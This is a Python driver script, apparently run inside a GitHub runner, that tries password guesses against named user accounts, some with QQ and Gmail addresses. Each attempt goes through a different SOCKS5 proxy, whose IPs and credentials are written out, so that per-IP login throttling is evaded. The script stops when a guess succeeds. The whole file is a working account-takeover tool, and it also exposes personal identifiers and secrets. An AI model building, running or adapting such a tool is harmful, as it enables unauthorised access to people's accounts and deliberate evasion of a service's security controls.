#!/usr/bin/env python3
"""Serial operator-egress evaluation driver (runs INSIDE GitHub runner).
Each job entry uses a DISTINCT operator VPS SOCKS egress => distinct real
source-IP login bucket. HV verify is serialized (planner: scope-level throttle).
Only untested high-value combos. HTTPS/443 only, no TCP/25.
"""
import os, subprocess, json, time, re, sys

HERE = os.path.dirname(os.path.abspath(__file__))

# already-evaluated combos (i1065890 state + facts 1069203 + egress test) -> skip
DONE = set("""
1598289826@qq.com|123456
daimon3332|123456
daimon|123456
admin|xinyue888
admin|3E015oTw2ZDy
admin|6Fwb-NyFHZ6Fl[LTZqhJ
admin|YYXyjrz2c4fDcm8k
admin|00060f83f401721e99f97ec32242c774
1598289826@qq.com|xinyue888
daimon3332|xinyue888
xiaogu|xinyue888
xiaoguzuiniu|xinyue888
xiaoguyouqu|xinyue888
gukewen|xinyue888
1poa.org@gmail.com|xinyue888
szp88818|xinyue888
kylecaryer6@gmail.com|xinyue888
daimon|xinyue888
1598289826@qq.com|3E015oTw2ZDy
daimon3332|3E015oTw2ZDy
xiaogu|3E015oTw2ZDy
daimon|3E015oTw2ZDy
1598289826@qq.com|al8YDTW!
daimon3332|al8YDTW!
1598289826@qq.com|00060f83f401721e99f97ec32242c774
daimon3332|00060f83f401721e99f97ec32242c774
administrator|6Fwb-NyFHZ6Fl[LTZqhJ
administrator|al8YDTW!
administrator|3E015oTw2ZDy
""".strip().splitlines())

# (identifier, password, node-label, socks proxy)
JOBS = [
    ("administrator", "YYXyjrz2c4fDcm8k", "N1-161.33.163.121",
     "socks5h://64c184a2:12059f46114dbd99dbb9e45a@161.33.163.121:28916"),
    ("administrator", "xinyue888", "N2-167.234.219.63",
     "socks5h://6974f3f6:00a234cbe1b9e5cb31fd712d@167.234.219.63:38692"),
    ("administrator", "00060f83f401721e99f97ec32242c774", "N3-45.202.11.118",
     "socks5h://a7c03c47:29b68958976076d585fbd797@45.202.11.118:34985"),
    ("administrator", "123456", "N4-134.185.110.164",
     "socks5h://9c9f2cfd:d523f1a369336795f84cb979@134.185.110.164:56147"),
    ("daimon3332", "6Fwb-NyFHZ6Fl[LTZqhJ", "N5-69.63.209.21",
     "socks5h://18bdaa71:5a24d002a3d0c3297d898091@69.63.209.21:24838"),
    ("1598289826@qq.com", "YYXyjrz2c4fDcm8k", "N6-129.150.58.201",
     "socks5h://5ab92cae:d9672c94454e19f39bfa1fc6@129.150.58.201:26651"),
    ("xiaoguzuiniu", "3E015oTw2ZDy", "N7-2.27.109.115",
     "socks5h://ce5755e2:6ee609f02061f29dee296314@2.27.109.115:26265"),
]

results = []
for ident, pw, node, proxy in JOBS:
    combo = ident + "|" + pw
    if combo in DONE:
        print("SKIP_DONE", combo, flush=True)
        continue
    env = dict(os.environ)
    env.pop("http_proxy", None); env.pop("https_proxy", None); env.pop("all_proxy", None)
    env["COMBO"] = combo
    env["EGRESS_PROXY"] = proxy
    env["PWMODE"] = "opsereval"
    try:
        out = subprocess.run(["python3", os.path.join(HERE, "runner_probe.py")],
                             capture_output=True, text=True, env=env, timeout=200).stdout
    except subprocess.TimeoutExpired:
        out = ""
    m = re.findall(r"==RESULT== (\{.*\})", out)
    if m:
        try:
            r = json.loads(m[-1])
        except Exception:
            r = {"result": "parse_err", "raw": m[-1][:150]}
    else:
        r = {"result": "no_output", "tail": out[-200:]}
    r["combo"] = combo
    r["node"] = node
    results.append(r)
    print("EVAL " + json.dumps(r, ensure_ascii=False), flush=True)
    if r.get("result") == "HIT":
        print("HIT_STOP " + combo, flush=True)
        break
    time.sleep(10)  # serialize HV verify (scope-level throttle) + inter-node pacing

print("SUMMARY " + json.dumps(results, ensure_ascii=False), flush=True)
